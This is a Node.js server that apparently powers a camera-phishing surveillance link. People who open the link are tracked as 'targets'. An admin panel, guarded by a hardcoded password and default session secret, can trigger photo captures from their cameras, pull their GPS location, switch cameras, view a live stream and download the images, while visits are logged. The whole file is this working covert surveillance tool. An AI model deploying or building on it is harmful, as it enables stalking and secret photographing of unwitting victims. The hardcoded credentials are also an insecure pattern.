const express = require("express");
const http = require("http");
const path = require("path");
const fs = require("fs");
const crypto = require("crypto");
const session = require("express-session");
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);

app.set("trust proxy", 1);

const io = new Server(server, {
    maxHttpBufferSize: 3 * 1024 * 1024,
    pingTimeout: 20000,
    pingInterval: 25000
});

const PORT = process.env.PORT || 3000;
const ADMIN_PASSWORD = "ayaz;;";
const SESSION_SECRET = process.env.SESSION_SECRET || "AyazSecretSession2026";

const MAX_USERS = 5;
const MAX_HISTORY = 1000;
const MAX_TEMP_PHOTOS = 100;

const PUBLIC_DIR = path.join(__dirname, "public");
const DATA_DIR = path.join(__dirname, "data");
const HISTORY_FILE = path.join(DATA_DIR, "access-history.json");

if (!fs.existsSync(PUBLIC_DIR)) {
    fs.mkdirSync(PUBLIC_DIR, { recursive: true });
}

if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
}

app.use(express.json({ limit: "1mb" }));

const sessionMiddleware = session({
    secret: SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: {
        httpOnly: true,
        sameSite: "lax",
        secure: process.env.NODE_ENV === "production",
        maxAge: 1000 * 60 * 60 * 8
    }
});

app.use(sessionMiddleware);
app.use(express.static(PUBLIC_DIR));

let isLinkActive = true;
let isAutoCaptureOn = true;

const connectedTargets = new Map();
const tempPhotos = new Map();
const authenticatedAdmins = new Set();
let accessHistory = loadHistory();

function loadHistory() {
    try {
        if (!fs.existsSync(HISTORY_FILE)) {
            fs.writeFileSync(HISTORY_FILE, JSON.stringify([], null, 2));
            return [];
        }
        const raw = fs.readFileSync(HISTORY_FILE, "utf8");
        if (!raw.trim()) return [];
        const parsed = JSON.parse(raw);
        return Array.isArray(parsed) ? parsed : [];
    } catch (error) {
        return [];
    }
}

function saveHistory() {
    try {
        fs.writeFileSync(HISTORY_FILE, JSON.stringify(accessHistory, null, 2));
    } catch (error) {}
}

function addHistory(record) {
    accessHistory.push({
        id: crypto.randomUUID(),
        ...record
    });
    if (accessHistory.length > MAX_HISTORY) {
        accessHistory = accessHistory.slice(-MAX_HISTORY);
    }
    saveHistory();
}

function isAdminRequest(req) {
    return req.session && req.session.isAdmin === true;
}

function requireAdmin(req, res, next) {
    if (!isAdminRequest(req)) {
        return res.status(401).json({ ok: false, error: "Admin authentication required." });
    }
    next();
}

function isValidImageData(data) {
    if (typeof data !== "string") return false;
    return /^data:image\/(jpeg|jpg|png|webp);base64,/i.test(data);
}

function getImageExtension(data) {
    const match = data.match(/^data:image\/(jpeg|jpg|png|webp);base64,/i);
    if (!match) return null;
    const type = match[1].toLowerCase();
    if (type === "jpg" || type === "jpeg") return "jpg";
    if (type === "png") return "png";
    if (type === "webp") return "webp";
    return null;
}

function cleanBase64(data) {
    return data.replace(/^data:image\/(jpeg|jpg|png|webp);base64,/i, "");
}

function getPublicTarget(target) {
    return {
        id: target.id,
        deviceInfo: target.deviceInfo,
        connectedAt: target.connectedAt,
        location: target.location,
        cameraReady: target.cameraReady
    };
}

function getPublicTargets() {
    const result = {};
    for (const [id, target] of connectedTargets.entries()) {
        result[id] = getPublicTarget(target);
    }
    return result;
}

function emitUsersList() {
    io.to("admins").emit("update-users-list", getPublicTargets());
}

app.get("/", (req, res) => {
    res.sendFile(path.join(PUBLIC_DIR, "user.html"));
});

app.get("/user.html", (req, res) => {
    res.sendFile(path.join(PUBLIC_DIR, "user.html"));
});

app.get("/admin.html", (req, res) => {
    res.sendFile(path.join(PUBLIC_DIR, "admin.html"));
});

app.post("/api/admin/login", (req, res) => {
    const { password } = req.body || {};
    if (typeof password !== "string" || password !== ADMIN_PASSWORD) {
        return res.status(401).json({ ok: false, error: "Wrong password." });
    }
    req.session.isAdmin = true;
    req.session.save(() => {
        res.json({ ok: true });
    });
});

app.post("/api/admin/logout", requireAdmin, (req, res) => {
    req.session.destroy(() => {
        res.json({ ok: true });
    });
});

app.get("/api/admin/status", (req, res) => {
    res.json({ ok: true, authenticated: isAdminRequest(req) });
});

app.get("/api/admin/state", requireAdmin, (req, res) => {
    res.json({
        ok: true,
        linkActive: isLinkActive,
        autoCapture: isAutoCaptureOn,
        maxUsers: MAX_USERS,
        activeUsers: connectedTargets.size,
        tempPhotos: tempPhotos.size
    });
});

app.get("/api/admin/history", requireAdmin, (req, res) => {
    res.json({ ok: true, history: accessHistory.slice().reverse() });
});

app.post("/api/admin/link", requireAdmin, (req, res) => {
    isLinkActive = Boolean(req.body.active);
    if (!isLinkActive) {
        io.to("users").emit("disable-user-access");
    }
    io.to("admins").emit("link-status", isLinkActive);
    res.json({ ok: true, active: isLinkActive });
});

app.post("/api/admin/auto-capture", requireAdmin, (req, res) => {
    isAutoCaptureOn = Boolean(req.body.enabled);
    io.to("admins").emit("auto-capture-status", isAutoCaptureOn);
    res.json({ ok: true, enabled: isAutoCaptureOn });
});

app.get("/api/admin/photos", requireAdmin, (req, res) => {
    res.json({ ok: true, photos: Array.from(tempPhotos.values()) });
});

app.get("/api/admin/photos/:id/download", requireAdmin, (req, res) => {
    const photo = tempPhotos.get(req.params.id);
    if (!photo) return res.status(404).send("Photo not found.");
    const extension = photo.extension || "jpg";
    const buffer = Buffer.from(cleanBase64(photo.imageData), "base64");
    res.setHeader("Content-Type", `image/${extension === "jpg" ? "jpeg" : extension}`);
    res.setHeader("Content-Disposition", `attachment; filename="capture-${photo.id}.${extension}"`);
    res.send(buffer);
});

app.delete("/api/admin/photos/:id", requireAdmin, (req, res) => {
    const existed = tempPhotos.delete(req.params.id);
    io.to("admins").emit("photo-deleted", req.params.id);
    res.json({ ok: true, deleted: existed });
});

io.on("connection", (socket) => {
    socket.on("admin-auth", (password) => {
        if (password !== ADMIN_PASSWORD) {
            socket.emit("admin-auth-required");
            return;
        }
        authenticatedAdmins.add(socket.id);
        socket.join("admins");
        socket.emit("admin-initial-state", {
            linkActive: isLinkActive,
            autoCapture: isAutoCaptureOn,
            users: getPublicTargets(),
            history: accessHistory.slice().reverse(),
            photos: Array.from(tempPhotos.values()),
            maxUsers: MAX_USERS
        });
    });

    socket.on("admin-select-user", (targetSocketId) => {
        if (!authenticatedAdmins.has(socket.id)) return;
        if (!connectedTargets.has(targetSocketId)) return;
        socket.data.selectedUser = targetSocketId;
    });

    socket.on("admin-trigger-capture", (targetSocketId) => {
        if (!authenticatedAdmins.has(socket.id)) return;
        if (!isLinkActive || !connectedTargets.has(targetSocketId)) return;
        io.to(targetSocketId).emit("capture-photo");
    });

    socket.on("admin-request-location", (targetSocketId) => {
        if (!authenticatedAdmins.has(socket.id)) return;
        if (!isLinkActive || !connectedTargets.has(targetSocketId)) return;
        io.to(targetSocketId).emit("request-location");
    });

    socket.on("admin-switch-camera", (targetSocketId) => {
        if (!authenticatedAdmins.has(socket.id)) return;
        if (!isLinkActive || !connectedTargets.has(targetSocketId)) return;
        io.to(targetSocketId).emit("switch-camera");
    });

    socket.on("user-connect-info", (data) => {
        if (!isLinkActive) {
            socket.emit("link-disabled");
            return;
        }

        if (!connectedTargets.has(socket.id)) {
            if (connectedTargets.size >= MAX_USERS) {
                socket.emit("server-full", { maxUsers: MAX_USERS });
                socket.disconnect(true);
                return;
            }

            const target = {
                id: socket.id,
                deviceInfo: data && typeof data.deviceInfo === "string" ? data.deviceInfo.slice(0, 150) : "Web User",
                connectedAt: new Date().toLocaleString(),
                location: null,
                cameraReady: false,
                autoCaptureStarted: false
            };

            connectedTargets.set(socket.id, target);
            socket.join("users");

            const timeStr = new Date().toISOString();
            addHistory({
                event: "link-opened",
                socketId: socket.id,
                deviceInfo: target.deviceInfo,
                time: timeStr
            });

            emitUsersList();
            io.to("admins").emit("access-event", {
                event: "link-opened",
                socketId: socket.id,
                deviceInfo: target.deviceInfo,
                time: timeStr
            });
        }
    });

    socket.on("user-ready", (data) => {
        if (!isLinkActive) {
            socket.emit("link-disabled");
            return;
        }

        let target = connectedTargets.get(socket.id);
        if (!target) {
            if (connectedTargets.size >= MAX_USERS) {
                socket.emit("server-full", { maxUsers: MAX_USERS });
                socket.disconnect(true);
                return;
            }
            target = {
                id: socket.id,
                deviceInfo: data && typeof data.deviceInfo === "string" ? data.deviceInfo.slice(0, 150) : "Web User",
                connectedAt: new Date().toLocaleString(),
                location: null,
                cameraReady: false,
                autoCaptureStarted: false
            };
            connectedTargets.set(socket.id, target);
            socket.join("users");
            const timeStr = new Date().toISOString();
            addHistory({
                event: "link-opened",
                socketId: socket.id,
                deviceInfo: target.deviceInfo,
                time: timeStr
            });
            io.to("admins").emit("access-event", {
                event: "link-opened",
                socketId: socket.id,
                deviceInfo: target.deviceInfo,
                time: timeStr
            });
        }

        target.cameraReady = true;
        if (isAutoCaptureOn && !target.autoCaptureStarted) {
            target.autoCaptureStarted = true;
            socket.emit("start-auto-capture");
        }
        emitUsersList();
    });

    socket.on("user-location", (locData) => {
        const target = connectedTargets.get(socket.id);
        if (!target || !locData || typeof locData.latitude !== "number" || typeof locData.longitude !== "number") return;

        target.location = {
            latitude: Number(locData.latitude.toFixed(6)),
            longitude: Number(locData.longitude.toFixed(6))
        };
        emitUsersList();
    });

    socket.on("live-stream-frame", (frameData) => {
        if (!isLinkActive || !connectedTargets.has(socket.id) || !isValidImageData(frameData)) return;

        for (const [adminSocketId, adminSocket] of io.sockets.sockets) {
            if (
                adminSocket.data &&
                adminSocket.data.selectedUser === socket.id &&
                authenticatedAdmins.has(adminSocketId)
            ) {
                adminSocket.emit("update-live-stream", { socketId: socket.id, frameData });
            }
        }
    });

    socket.on("user-photo-captured", (imageData) => {
        if (!isLinkActive || !connectedTargets.has(socket.id) || !isValidImageData(imageData)) return;
        if (imageData.length > 2.5 * 1024 * 1024 || tempPhotos.size >= MAX_TEMP_PHOTOS) return;

        const extension = getImageExtension(imageData);
        if (!extension) return;

        const photo = {
            id: crypto.randomUUID(),
            imageData,
            extension,
            socketId: socket.id,
            deviceInfo: connectedTargets.get(socket.id)?.deviceInfo || "Web User",
            capturedAt: new Date().toISOString()
        };

        tempPhotos.set(photo.id, photo);
        io.to("admins").emit("new-photo", photo);
    });

    socket.on("disconnect", () => {
        authenticatedAdmins.delete(socket.id);
        const target = connectedTargets.get(socket.id);
        if (target) {
            const timeStr = new Date().toISOString();
            addHistory({
                event: "link-closed",
                socketId: socket.id,
                deviceInfo: target.deviceInfo,
                time: timeStr
            });
            io.to("admins").emit("access-event", {
                event: "link-closed",
                socketId: socket.id,
                deviceInfo: target.deviceInfo,
                time: timeStr
            });
            connectedTargets.delete(socket.id);
            emitUsersList();
        }
    });
});

server.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on port ${PORT}`);
});